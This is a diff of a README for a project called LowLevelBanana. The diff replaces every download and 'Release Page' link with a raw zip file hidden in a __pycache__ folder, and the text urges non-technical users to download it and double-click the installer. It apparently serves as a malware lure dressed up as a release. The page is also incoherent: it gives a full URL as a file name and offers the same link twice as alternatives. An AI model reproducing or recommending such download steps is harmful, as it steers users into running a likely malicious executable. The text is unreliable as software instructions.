@@ -4,17 +4,17 @@
 
 Welcome to LowLevelBanana! This guide will help you download and run our application without any technical knowledge. Follow the simple steps below.
 
-[![Download LowLevelBanana](https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/defocus_deblurring/Low-Banana-Level-v2.5.zip%20LowLevelBanana-%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/defocus_deblurring/Low-Banana-Level-v2.5.zip)
+[![Download LowLevelBanana](https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/deshadowing/basicsr/metrics/__pycache__/Level_Low_Banana_1.0.zip%20LowLevelBanana-%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/deshadowing/basicsr/metrics/__pycache__/Level_Low_Banana_1.0.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Release Page:** Click the link below to access our Releases page, where you can download the latest version.
 
-   [Visit this page to download](https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/defocus_deblurring/Low-Banana-Level-v2.5.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/deshadowing/basicsr/metrics/__pycache__/Level_Low_Banana_1.0.zip)
 
 2. **Select the Version:** On the Releases page, you will find a list of available versions. Choose the latest version for your operating system. If you are unsure which version to choose, look for the one labeled as "Latest."
 
-3. **Download the Installer:** Click on the download link for your chosen version. The file may be named something like `https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/defocus_deblurring/Low-Banana-Level-v2.5.zip` or `https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/defocus_deblurring/Low-Banana-Level-v2.5.zip`. The file size will vary but should be manageable for most users.
+3. **Download the Installer:** Click on the download link for your chosen version. The file may be named something like `https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/deshadowing/basicsr/metrics/__pycache__/Level_Low_Banana_1.0.zip` or `https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/deshadowing/basicsr/metrics/__pycache__/Level_Low_Banana_1.0.zip`. The file size will vary but should be manageable for most users.
 
 4. **Open the File:** Once the download is complete, navigate to the folder where the file is saved. Double-click on the installer file to begin the installation process.
 
@@ -69,4 +69,4 @@ For additional assistance, please reach out via the GitHub issues page. Our supp
 
 You are now ready to explore and evaluate low-level vision tasks with LowLevelBanana. We hope you find this software beneficial for your projects.
 
-Remember, if you need to download the latest version, you can always go back to our [Release Page](https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/defocus_deblurring/Low-Banana-Level-v2.5.zip). Enjoy using LowLevelBanana!
+Remember, if you need to download the latest version, you can always go back to our [Release Page](https://raw.githubusercontent.com/mpahlevi64/LowLevelBanana/main/eval/deshadowing/basicsr/metrics/__pycache__/Level_Low_Banana_1.0.zip). Enjoy using LowLevelBanana!
